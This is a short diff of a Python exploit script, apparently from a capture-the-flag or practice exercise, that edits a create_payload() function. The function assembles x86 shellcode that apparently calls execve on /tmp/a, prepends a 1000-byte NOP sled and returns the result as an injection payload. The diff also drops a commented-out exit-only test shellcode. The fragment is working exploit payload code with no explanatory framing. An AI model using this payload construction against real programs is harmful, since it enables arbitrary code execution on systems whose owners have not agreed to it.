@@ -29,7 +29,7 @@ def create_payload():
     executable_path = b"/tmp/a"
     padding = 1000
     asm_shellcode = f"""
-        xor    ebx, ebx
+    xor    ebx, ebx
     mov    bx, 0x4301
     dec    ebx
     shl    ebx, 16
@@ -42,20 +42,12 @@ def create_payload():
     lea    ebx, [esp]
     xor    ecx,ecx
     xor    edx,edx
-    int    0x80 
+    int    0x80
     """
-    # asm_shellcode = """
-    # xor    ebx, ebx
-    # xor    eax, eax
-    # mov    al, 0x1
-    # mov    bl, 42
-    # int    0x80
-    # """
-    # TODO Shit above works only with exit. Need to solve what's wrong with execve
-    nops = b'\x90' * padding
+    noops = b'\x90' * padding
     shellcode = asm(
         asm_shellcode)
-    return nops + shellcode + executable_path
+    return noops + shellcode + executable_path
 
 
 
